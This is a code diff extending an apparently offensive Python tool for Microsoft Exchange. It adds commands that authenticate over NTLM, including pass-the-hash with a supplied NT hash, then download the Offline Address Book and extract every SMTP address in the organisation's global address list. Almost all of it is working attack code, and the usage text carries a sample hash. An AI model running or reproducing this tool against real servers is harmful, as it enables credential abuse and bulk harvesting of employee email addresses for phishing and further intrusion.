@@ -6,6 +6,8 @@ import base64
 import re
 import binascii
 import gzip
+import shutil
+
 try:
     from http.client import HTTPConnection, HTTPSConnection, ResponseNotReady
 except ImportError:
@@ -117,6 +119,10 @@ def checkAutodiscover(host, port, mode, email, data):
             pattern_name = re.compile(r"<LegacyDN>(.*?)</LegacyDN>")
             name = pattern_name.findall(filedata)
             print('[+] LegacyDN：%s'%(name[0]))
+
+            pattern_name = re.compile(r"<OABUrl>(.*?)</OABUrl>")
+            name = pattern_name.findall(filedata)
+            print('[+] OABUrl：%s'%(name[0]))
 
             if 'InternalUrl' in filedata:
                 pattern_name = re.compile(r"<InternalUrl>(.*?)</InternalUrl>")
@@ -268,6 +274,208 @@ def getUsersetting(host, port, mode, email, data):
             file_object.write(bytes.decode(body))
         return True
 
+def checkOAB(host, port, mode, email, data):
+
+    OABID = input("Input the OABID:")
+    OAB_url = "/OAB/" + OABID + "/oab.xml"
+    tmp = email.split('@')
+    user = tmp[0]
+
+    if port ==443:
+        try:
+            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+            session = HTTPSConnection(host, port, context=uv_context)
+        except AttributeError:
+            session = HTTPSConnection(host, port)
+    else:        
+        session = HTTPConnection(host, port)
+
+    # Use impacket for NTLM
+    ntlm_nego = ntlm.getNTLMSSPType1(host)
+
+    #Negotiate auth
+    negotiate = base64.b64encode(ntlm_nego.getData())
+    # Headers
+    headers = {
+        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
+        "Content-type": "text/xml; charset=utf-8",
+        "Accept": "text/xml",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    }
+    session.request("GET", OAB_url, "", headers)
+
+    res = session.getresponse()
+    res.read()
+
+    if res.status != 401:
+        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
+        return False
+    try:
+        if 'NTLM' not in res.getheader('WWW-Authenticate'):
+            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
+            return False
+    except (KeyError, TypeError):
+        print('No authentication requested by the server for url %s'%(OAB_url))
+        return False
+
+    print('[*] Got 401, performing NTLM authentication')
+    # Get negotiate data
+    try:
+        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
+        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
+    except (IndexError, KeyError, AttributeError):
+        print('No NTLM challenge returned from server')
+        return False
+    
+    if mode =='plaintext':
+        password1 = data;
+        nt_hash = ''
+
+    elif mode =='ntlmhash':
+        password1 = ''
+        nt_hash = binascii.unhexlify(data)
+
+    else:
+        print('[!]Wrong parameter')
+        return False
+
+    lm_hash = ''    
+    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, host, lm_hash, nt_hash)
+    auth = base64.b64encode(ntlm_auth.getData())
+
+    headers = {
+        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
+        "Content-type": "text/xml; charset=utf-8",
+        "Accept": "text/xml",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    }
+
+    session.request("GET", OAB_url, "", headers)
+    res = session.getresponse()
+    body = res.read()
+  
+    if res.status == 401:
+        print('[!] Server returned HTTP status 401 - authentication failed')
+        return False
+    else:
+        filename = "checkOAB.xml"
+        print('[+] Save response file to %s'%(filename))
+        with open(filename, 'w+', encoding='utf-8') as file_object:
+            file_object.write(bytes.decode(body))
+
+        pattern_name = re.compile(r">(.+lzx)<")
+        name = pattern_name.findall(bytes.decode(body))      
+        if name:
+            print('[+] Default Global Address:%s'%(name[0]))
+
+        return True
+
+
+
+
+def downloadlzx(host, port, mode, email, data):
+
+    OABID = input("Input the OABID:")
+    lzxID = input("Input the lzx ID:(Eg: xx.lzx)")
+
+    lzxURL = "/OAB/" + OABID + "/" + lzxID
+    tmp = email.split('@')
+    user = tmp[0]
+
+    if port ==443:
+        try:
+            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
+            session = HTTPSConnection(host, port, context=uv_context)
+        except AttributeError:
+            session = HTTPSConnection(host, port)
+    else:        
+        session = HTTPConnection(host, port)
+
+    # Use impacket for NTLM
+    ntlm_nego = ntlm.getNTLMSSPType1(host)
+
+    #Negotiate auth
+    negotiate = base64.b64encode(ntlm_nego.getData())
+    # Headers
+    headers = {
+        "Authorization": 'NTLM %s' % negotiate.decode('utf-8'),
+        "Content-type": "text/xml; charset=utf-8",
+        "Accept": "text/xml",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    }
+    session.request("GET", lzxURL, "", headers)
+
+    res = session.getresponse()
+    res.read()
+
+    if res.status != 401:
+        print('Status code returned: %d. Authentication does not seem required for URL'%(res.status))
+        return False
+    try:
+        if 'NTLM' not in res.getheader('WWW-Authenticate'):
+            print('NTLM Auth not offered by URL, offered protocols: %s'%(res.getheader('WWW-Authenticate')))
+            return False
+    except (KeyError, TypeError):
+        print('No authentication requested by the server for url %s'%(lzxURL))
+        return False
+
+    print('[*] Got 401, performing NTLM authentication')
+    # Get negotiate data
+    try:
+        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
+        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
+    except (IndexError, KeyError, AttributeError):
+        print('No NTLM challenge returned from server')
+        return False
+    
+    if mode =='plaintext':
+        password1 = data;
+        nt_hash = ''
+
+    elif mode =='ntlmhash':
+        password1 = ''
+        nt_hash = binascii.unhexlify(data)
+
+    else:
+        print('[!]Wrong parameter')
+        return False
+
+    lm_hash = ''    
+    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, user, password1, host, lm_hash, nt_hash)
+    auth = base64.b64encode(ntlm_auth.getData())
+
+    headers = {
+        "Authorization": 'NTLM %s' % auth.decode('utf-8'),
+        "Content-type": "text/xml; charset=utf-8",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-Site": "none",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "User-Agent": "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
+    }
+
+    session.request("GET", lzxURL, "", headers)
+    res = session.getresponse()
+    body = res.read()    
+    filedata = gzip.decompress(body)
+
+    if res.status == 401:
+        print('[!] Server returned HTTP status 401 - authentication failed')
+        return False
+    else:
+        if res.status == 200:            
+            filename = lzxID
+            print('[+] Save lzx file to %s'%(filename))
+            print('\r\n[*] Then you can use oabextract to decrype the lzx file in Kali Linux.')
+            print('Eg.')            
+            print('oabextract 4667c322-5c08-4cda-844a-253ff36b4a6a-data-5.lzx gal.oab')
+            print('strings gal.oab|grep SMTP')
+            with open(filename, 'wb+') as file_object:
+                file_object.write(filedata)
+
+        return True
+
 if __name__ == '__main__':
     if len(sys.argv)!=7:
         print('checkAutodiscover')       
@@ -277,6 +485,8 @@ if __name__ == '__main__':
         print('<command>:')
         print('- checkautodiscover')
         print('- getusersetting')
+        print('- checkOAB')
+        print('- downloadlzx')       
         print('Eg.')
         print('%s 192.168.1.1 443 plaintext user1@test.com password1 checkautodiscover'%(sys.argv[0]))
         print('%s test.com 80 ntlmhash user1@test.com c5a237b7e9d8e708d8436b6148a25fa1 getusersetting'%(sys.argv[0]))
@@ -285,8 +495,14 @@ if __name__ == '__main__':
         if sys.argv[6] == "checkautodiscover":
             checkAutodiscover(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5])
         elif sys.argv[6] == "getusersetting": 
-            getUsersetting(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5])       
+            getUsersetting(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]) 
+        elif sys.argv[6] == "checkOAB": 
+            checkOAB(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]) 
+        elif sys.argv[6] == "downloadlzx": 
+            downloadlzx(sys.argv[1], int(sys.argv[2]), sys.argv[3], sys.argv[4], sys.argv[5]) 
+
         else:
             print('[!]Wrong parameter')
 
 
+            
